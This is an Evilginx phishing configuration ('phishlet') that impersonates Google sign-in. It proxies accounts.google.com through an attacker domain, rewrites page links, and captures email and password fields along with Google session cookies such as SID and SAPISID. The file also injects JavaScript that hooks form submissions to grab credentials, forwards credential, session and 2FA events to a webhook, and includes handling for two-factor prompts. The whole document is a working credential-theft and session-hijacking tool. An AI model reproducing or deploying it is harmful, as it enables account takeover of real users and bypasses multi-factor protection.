# Google phishlet for Evilginx v3.3.0
version: "3.0"
author: "AuthFlow"
name: "google"

# Main domain configuration
domain: "google.com"

# Hosts configuration
hosts:
  - hostname: "{{.Endpoint3}}.{{.Domain}}"
    path: "/"
    session: true
    is_landing: true
  - hostname: "{{.Endpoint3}}.{{.Domain}}"
    path: "/ServiceLogin"
    session: true
  - hostname: "{{.Endpoint3}}.{{.Domain}}"
    path: "/signin"
    session: true
  - hostname: "{{.Endpoint3}}.{{.Domain}}"
    path: "/accounts"
    session: true

# Phishing configuration
phish:
  - domain: "accounts.google.com"
    path: "/"
    method: "GET"
    
    request_mods:
      - header: "Host"
        value: "{{.Endpoint3}}.{{.Domain}}"
      - header: "Origin"
        value: "https://{{.Endpoint3}}.{{.Domain}}"
      - header: "Referer"
        value: "https://{{.Endpoint3}}.{{.Domain}}/"
    
    response_mods:
      - mime: ["text/html", "application/javascript", "text/javascript"]
        regex: '(action=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'
      - mime: ["text/html", "application/javascript", "text/javascript"]
        regex: '(href=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'
      - mime: ["text/html", "application/javascript", "text/javascript"]
        regex: '(src=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'
      - mime: ["text/html", "application/javascript", "text/javascript"]
        regex: '(data-post-url=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'
      - mime: ["text/html"]
        regex: 'postBody: {values: {',
        replacement: 'postBody: {values: {__PASSTHRU_PASSTHRU__: "",'

  - domain: "accounts.google.com"
    path: "/signin/v2"
    method: "POST"
    
    request_mods:
      - header: "Host"
        value: "{{.Endpoint3}}.{{.Domain}}"
      - header: "Origin"
        value: "https://{{.Endpoint3}}.{{.Domain}}"
    
    response_mods:
      - mime: ["text/html"]
        regex: '(action=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'
      - mime: ["text/html"]
        regex: '(href=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'

  - domain: "accounts.google.com"
    path: "/signin/v2/challenge"
    method: "POST"
    
    request_mods:
      - header: "Host"
        value: "{{.Endpoint3}}.{{.Domain}}"
    
    response_mods:
      - mime: ["text/html"]
        regex: '(action=["\'])(https?://[^"\']+)'
        replacement: '$1https://{{.Endpoint3}}.{{.Domain}}$2'

# Session tokens to capture
tokens:
  - name: "__Secure-3PSID"
    domain: ".google.com"
    path: "/"
  - name: "__Secure-3PAPISID"
    domain: ".google.com"
    path: "/"
  - name: "__Secure-3PSIDCC"
    domain: ".google.com"
    path: "/"
  - name: "SID"
    domain: ".google.com"
    path: "/"
  - name: "HSID"
    domain: ".google.com"
    path: "/"
  - name: "SSID"
    domain: ".google.com"
    path: "/"
  - name: "APISID"
    domain: ".google.com"
    path: "/"
  - name: "SAPISID"
    domain: ".google.com"
    path: "/"

# Credential capture
creds:
  - type: "post"
    name: "email"
    key: "identifier"
    pattern: '(.*)'
  - type: "post"
    name: "password"
    key: "password"
    pattern: '(.*)'

# JavaScript injections
js_injections:
  - trigger_domains: ["accounts.google.com", "{{.Endpoint3}}.{{.Domain}}"]
    trigger_paths: ["/.*"]
    code: |
      (function() {
        'use strict';
        
        // Pre-fill email if provided
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailInput = document.querySelector('input[type="email"], input[name="identifier"]');
          if (emailInput) {
            emailInput.value = email;
            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
            
            // Trigger validation
            var event = new Event('change', { bubbles: true });
            emailInput.dispatchEvent(event);
          }
        }
        
        // Monitor for password field and track attempts
        var observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
              var passwordInput = document.querySelector('input[type="password"]');
              if (passwordInput && !passwordInput._hooked) {
                passwordInput._hooked = true;
                passwordInput.addEventListener('input', function() {
                  var container = this.closest('form');
                  if (container) {
                    container.setAttribute('data-password-entered', 'true');
                  }
                });
              }
            }
          });
        });
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        });
        
        // Intercept form submission
        var originalSubmit = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function() {
          if (this.action && this.action.includes('accounts.google.com')) {
            var formData = new FormData(this);
            var creds = {
              email: formData.get('identifier') || formData.get('Email'),
              password: formData.get('password') || formData.get('Passwd')
            };
            
            if (creds.email && creds.password) {
              // Send to parent if in iframe
              if (window.parent !== window) {
                window.parent.postMessage({
                  type: 'credentials',
                  data: creds,
                  url: window.location.href
                }, '*');
              }
            }
          }
          return originalSubmit.apply(this, arguments);
        };
        
        // Also hook click on submit buttons
        document.addEventListener('click', function(e) {
          var submitBtn = e.target.closest('input[type="submit"], button[type="submit"]');
          if (submitBtn && submitBtn.form) {
            var form = submitBtn.form;
            if (form.action && form.action.includes('accounts.google.com')) {
              var formData = new FormData(form);
              var creds = {
                email: formData.get('identifier') || formData.get('Email'),
                password: formData.get('password') || formData.get('Passwd')
              };
              
              if (creds.email && creds.password) {
                if (window.parent !== window) {
                  window.parent.postMessage({
                    type: 'credentials',
                    data: creds,
                    url: window.location.href
                  }, '*');
                }
              }
            }
          }
        });
      })();

# Webhook configuration
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook/evilginx"
  headers:
    "X-Webhook-Secret": "{{.WebhookSecret}}"
    "Content-Type": "application/json"
  format: "json"
  events:
    - "creds"
    - "session"
    - "auth"
    - "2fa"

# Redirect after successful login
redirect_url: "https://mail.google.com"

# 2FA handling
two_factor:
  enabled: true
  detect_patterns:
    - "2-step verification"
    - "two-factor"
    - "verification code"
    - "authenticator"
  redirect_after: "https://accounts.google.com"

# Blacklist/Whitelist
blacklist:
  enabled: false
  ips: []
  masks: []

whitelist:
  enabled: false
  ips: []